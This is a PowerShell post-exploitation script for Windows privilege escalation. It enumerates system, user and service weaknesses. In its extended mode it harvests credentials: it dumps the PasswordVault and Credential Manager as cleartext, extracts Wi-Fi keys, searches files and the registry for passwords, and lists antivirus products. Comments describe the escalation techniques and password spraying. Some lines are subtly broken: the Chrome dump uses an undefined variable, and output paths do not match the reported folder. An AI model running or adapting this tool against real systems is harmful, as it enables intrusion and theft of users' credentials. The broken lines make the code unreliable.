# Usage
# run script directly from powershell for quick standard checks
# 
# For quick standard checks directly from CMD:
# powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
#
# To run extensive file searches use extended parameter (it can take a long time, be patient!):
# PS C:\> .\WindowsEnum.ps1 extended
# From CMD:
# powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended


param($extended)
 
$lines="------------------------------------------"
function whost($a) {
    Write-Host
    Write-Host -ForegroundColor Green $lines
    Write-Host -ForegroundColor Green " "$a 
    Write-Host -ForegroundColor Green $lines
}


whost "Windows Enumeration Script v 0.1
          by absolomb
       www.sploitspren.com"

$standard_commands = [ordered]@{

    'Basic System Information'                    = 'Start-Process "systeminfo" -NoNewWindow -Wait';
    'Environment Variables'                       = 'Get-ChildItem Env: | ft Key,Value';
    'Network Information'                         = 'Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address';
    'DNS Servers'                                 = 'Get-DnsClientServerAddress -AddressFamily IPv4 | ft';
    'ARP cache'                                   = 'Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State';
    'Routing Table'                               = 'Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex';
    'Network Connections'                         = 'Start-Process "netstat" -ArgumentList "-ano" -NoNewWindow -Wait | ft';
    'Connected Drives'                            = 'Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft';
    'Firewall Config'                             = 'Start-Process "netsh" -ArgumentList "firewall show config" -NoNewWindow -Wait | ft';
    'Current User'                                = 'Write-Host $env:UserDomain\$env:UserName';
    'User Privileges'                             = 'start-process "whoami" -ArgumentList "/priv" -NoNewWindow -Wait | ft';
    'Local Users'                                 = 'Get-LocalUser | ft Name,Enabled,LastLogon';
    'Logged in Users'                             = 'Start-Process "qwinsta" -NoNewWindow -Wait | ft';
    'Credential Manager'                          = 'start-process "cmdkey" -ArgumentList "/list" -NoNewWindow -Wait | ft'
    'User Autologon Registry Items'               = 'Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" | select "Default*" | ft';
    'Local Groups'                                = 'Get-LocalGroup | ft Name';
    'Local Administrators'                        = 'Get-LocalGroupMember Administrators | ft Name, PrincipalSource';
    'User Directories'                            = 'Get-ChildItem C:\Users | ft Name';
    'Searching for SAM backup files'              = 'Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM';
    'Running Processes'                           = 'gwmi -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize';
    'Installed Software Directories'              = 'Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | ft Parent,Name,LastWriteTime';
    'Software in Registry'                        = 'Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name';
    'Folders with Everyone Permissions'           = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "Everyone"} } catch {}} | ft';
    'Folders with BUILTIN\User Permissions'       = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "BUILTIN\Users"} } catch {}} | ft';
    'Checking registry for AlwaysInstallElevated' = 'Test-Path -Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer" | ft';
    'Unquoted Service Paths'                      = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike ''"*''} | select PathName, DisplayName, Name | ft';
    'Scheduled Tasks'                             = 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State';
    'Tasks Folder'                                = 'Get-ChildItem C:\Windows\Tasks | ft';
    'Startup Commands'                            = 'Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl';
    
}

$extended_commands = [ordered]@{

    'Searching for Unattend and Sysprep files' = 'Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | Out-File C:\windows\temp\unattendfiles.txt';
    'Searching for web.config files'           = 'Get-Childitem –Path C:\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\webconfigfiles.txt';
    'Searching for other interesting files'    = 'Get-Childitem –Path C:\ -Include *password*,*cred*,*vnc* -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\otherfiles.txt';
    'Searching for various config files'       = 'Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\windows\temp\configfiles.txt';
    'Searching HKLM for passwords'             = 'reg query HKLM /f password /t REG_SZ /s | Out-File C:\windows\temp\hklmpasswords.txt';
    'Searching HKCU for passwords'             = 'reg query HKCU /f password /t REG_SZ /s | Out-File C:\windows\temp\hkcupasswords.txt';
    'Searching for files with passwords'       = 'Get-ChildItem -Path C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike "*C:\temp*" -and $_.PSParentPath -notlike "*Reference Assemblies*" -and $_.PSParentPath -notlike "*Windows Kits*"}| Select-String -Pattern "password" | Out-File C:\windows\temp\password.txt';
    # Find potentially interesting files with Powershell, Recommended to do this for every disk drive, but you can also just run it on the c:\users folder for some quick wins.    
    'Searching for interesting files'          = 'Get-Childitem -Path C:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue | Out-File C:\windows\temp\password2.txt';
    # This command will look for remnants from automated installation and auto-configuration, which could potentially contain plaintext passwords or base64 encoded passwords:This is one of the well known privilege escalation techniques, as the password is typically local administrator password.Recommended to do this for every disk drive.
    'Searching for Sysprep or Unattend files'  = 'Get-Childitem -Path C:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue | Out-File C:\windows\temp\SysprepUnattend.txt';
    # Find configuration files containing “password” string. With this command we can locate files containing a certain pattern, e.g. here were are looking for a “password” pattern in various textual configuration files:Although this can produce a lot of noise, it could also yield some interesting results as well.Recommended to do this for every disk drive.
    'Searching for the string password'        = 'Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password" | Out-File C:\windows\temp\password3.txt';
    # Locate web server configuration files. With this command, we can easily find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:These files may contain plain text passwords or other interesting information which could allow accessing other resources such as databases, administrative interfaces etc.
    'Searching for Xamp Apache Php Mysql'      = 'Get-ChildItem -Path C:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue | Out-File C:\windows\temp\XampApachePhpMysql.txt';
    # Extracting Credentials. Get stored passwords from Windows PasswordVault.Using the following PowerShell command we can extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications:Note that the vault is typically stored in the following locations and it is only possible to retrieve the secrets under the context of the currently logged user:
    'Searching the Password Vault'             = '[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File C:\windows\temp\PasswordVault.txt';
    # Get stored passwords from Windows Credential Manager. Windows Credential Manager provides another mechanism of storing credentials for signing in to websites, logging to remote systems and various applications and it also provides a secure way of using credentials in PowerShell scripts.With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module: Similarly to PasswordVault, the credentials are stored in individual user profile locations and only the currently logged user can decrypt theirs:
    'Searching Credentials Manager'            = 'Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); } | Out-File C:\windows\temp\CredentialsManager.txt';
    # Dump passwords from Google Chrome browser. The following command extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:
    'Searching Google Chrome Browser'          = '[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) | Out-File C:\windows\temp\ChromeBrowser.txt';
    # Get stored Wi-Fi passwords from Wireless Profiles. With this command we can extract all stored Wi-Fi passwords (WEP, WPA PSK, WPA2 PSK etc.) from the wireless profiles that are configured in the Windows system: Note that we have to have administrative privileges in order for this to work.
    'Searching Wi-Fi passwords'                = '(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\windows\temp\WifiPasswords.txt';
    # Search for SNMP community string in registry. The following command will extract SNMP community string stored in the registry, if there is any: Finding a SNMP community string is not a critical issue, but it could be useful to: Understand what kind of password patterns are used among sysadmins in the organization. Perform password spraying attack (assuming that passwords might be re-used elsewhere)
    'Searching for SNMP community strings'     = 'Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue | Out-File C:\windows\temp\SnmpStrings.txt';
    # Search registry for auto-logon credentials. Windows systems can be configured to auto login upon boot, which is for example used on POS (point of sale) systems. Typically, this is configured by storing the username and password in a specific Winlogon registry location, in clear text. The following command will get the auto-login credentials from the registry:
    'Searching registry for autologon'         = 'gp "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select "Default*" | Out-File C:\windows\temp\AutoLogon.txt';
    # Check if AlwaysInstallElevated is enabled. If the following AlwaysInstallElevated registry keys are set to 1, it means that any low privileged user can install *.msi files with NT AUTHORITY\SYSTEM privileges. Here’s how to check it with PowerShell:
    'Searching for AlwaysInstallElevated'      = 'gp "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated | Out-File C:\windows\temp\AlwaysInstallElevated.txt';
    # Find unquoted service paths. The following PowerShell command will print out services whose executable path is not enclosed within quotes (“): This can lead to privilege escalation in case the executable path also contains spaces and we have write permissions to any of the folders in the path.
    #'Searching for Unquoted Service Paths'    = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name | Out-File C:\temp\UnquotedServicePaths.txt';
    # List installed antivirus (AV) products.Here’s a simple PowerShell command to query Security Center and identify all installed Antivirus products on this computer:
    'Searching AntiVirus products'             = 'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Out-File C:\windows\temp\AvProducts.txt';

}
function RunCommands($commands) {
    ForEach ($command in $commands.GetEnumerator()) {
        whost $command.Name
        Invoke-Expression $command.Value
    }
}


RunCommands($standard_commands)

if ($extended) {
    if ($extended.ToLower() -eq 'extended') {
        $result = Test-Path C:\temp
        if ($result -eq $False) {
            New-Item C:\temp -type directory
        }
        whost "Results writing to C:\temp\
    This may take a while..."
        RunCommands($extended_commands)
        whost "Script Finished! Check your files in C:\temp\"
    }
}
else {
    whost "Script finished!"
}
